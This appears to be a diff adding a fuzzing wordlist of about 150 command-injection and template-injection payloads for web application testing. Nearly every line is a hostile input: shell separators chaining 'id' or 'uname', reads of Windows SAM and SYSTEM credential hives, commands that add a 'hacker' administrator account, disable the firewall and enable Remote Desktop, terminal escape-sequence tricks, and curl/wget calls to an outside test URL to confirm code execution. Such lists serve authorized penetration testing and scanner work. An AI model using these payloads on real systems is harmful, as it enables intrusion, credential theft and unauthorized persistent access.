@@ -1,0 +1,148 @@
+which perl
+type %SYSTEMROOT%\repair\SAM
+| type C:\Windows\repair\SAM
+net view
+;id
+& 
+`id`
+a;id
+\nid;
+|id;
+which wget
+uname -a
+; type %SYSTEMROOT%\repair\SYSTEM
+& type C:\Windows\repair\SAM
+sleep 5
+\nid;
+; net user hacker Password1 /ADD
+\necho INJECTX\nexit\n\033[2Asleep 5\n
+ipconfig
+;id;
+dir
+%0a
+`
+a;id;
+\nid|
+;id|
+{{4+4}}
+& type %SYSTEMROOT%\repair\SYSTEM
+&& type C:\Windows\repair\SAM
+systeminfo
+\nid\n
+& net user hacker Password1 /ADD
+netsh firewall set opmode disable
+\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n
+& id
+dir C:\Users
+dir C:\
+%0a%0d
+|| 
+a);id|
+|id|
+/index.html|id|
+{{[] .__ Class __.__ base __.__ subclasses __ ()}}
+which netcat
+&& type %SYSTEMROOT%\repair\SAM
+type C:\Windows\repair\SYSTEM
+&& sysinfo
+\r
+&& net view
+| id
+"'
+%0a id %0a
+%0Aid%0A
+a);id
+{{4+8}}
+&& type %SYSTEMROOT%\repair\SYSTEM
+type C:\Windows\repair\SAM
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+pwd
+&& net user hacker Password1 /ADD
+| net localgroup Administrators hacker /ADD
+&&id
+| 
+%0a ping -i 30 127.0.0.1 %0a
+a;id|
+;id\n
+{{person.secret}}
+type %SYSTEMROOT%\repair\SYSTEM
+| type C:\Windows\repair\SYSTEM
+sysinfo
+\r\n
+| pwd
+net user hacker Password1 /ADD
+; net localgroup Administrators hacker /ADD
+;id\n
+a|id|
+%0Aid
+; 
+%0Aid
+a)|id
+{{person.name}}
+' whoami
+which curl
+uname
+| type %SYSTEMROOT%\repair\SAM
+; type C:\Windows\repair\SYSTEM
+| sysinfo
+route
+; pwd
+| net view
+& net localgroup Administrators hacker /ADD
+ifconfig
+a;id|
+%0a id %0a
+'
+| id
+a|id
+|nid\n
+;id;
+" whoami
+which python
+| type %SYSTEMROOT%\repair\SYSTEM
+; type C:\Windows\repair\SAM
+sleep 1
+\nid|
+| net user hacker Password1 /ADD
+\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n
+/index.html|id|
+;id|
+&& 
+a);id;
+|id
+{1} + {1}
+which gcc
+;uname;
+; type %SYSTEMROOT%\repair\SAM
+& type C:\Windows\repair\SYSTEM
+; sysinfo
+& pwd
+; net view
+&& net localgroup Administrators hacker /ADD
+ipconfig /all
+`id`
+a;id;
+%0Aid%0A
+'"
+& id
+`id`
+;id
+{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
+which nc
+& type %SYSTEMROOT%\repair\SAM
+&& type C:\Windows\repair\SYSTEM
+& sysinfo
+sleep 10
+&& pwd
+& net view
+net localgroup Administrators hacker /ADD
+\n
+|id
+dir C:\Documents and Settings\*
+curl https://crowdshield.com/.testing/rce_vuln.txt
+a;id\n
+%0a ping -i 30 127.0.0.1 %0a
+"
+; id
+a|id
+\nid\n
